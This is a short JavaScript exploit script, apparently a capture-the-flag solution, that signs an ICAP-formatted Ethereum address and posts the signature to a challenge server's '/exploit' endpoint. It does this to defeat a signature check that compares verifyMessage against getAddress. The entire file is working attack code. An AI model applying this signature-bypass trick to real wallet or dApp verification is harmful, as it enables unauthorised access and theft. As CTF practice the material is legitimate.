const ethers = require("ethers");
async function main() {
    // Create a signer
    signer = new ethers.Wallet(ethers.id("ng0jtr0ngt04l3tg40th3tt3n3m"))
    console.log(signer)

    // Create a Icap Address
    message = ethers.getIcapAddress(signer.address)

    // Signing the message
    sig = await signer.signMessage(message);
    console.log(sig)
    console.log(ethers.verifyMessage(message, sig) == ethers.getAddress(message))
    console.log(
        await fetch("http://web3.balsnctf.com:3000/exploit", {
            method: 'POST',
            body: JSON.stringify({
                message: message,
                signature: sig
            }),
            headers: {
                'Content-Type': 'application/json'
            }
        })
            .then(res => res.text())
            .then(v => v.toString())
    )
}
main()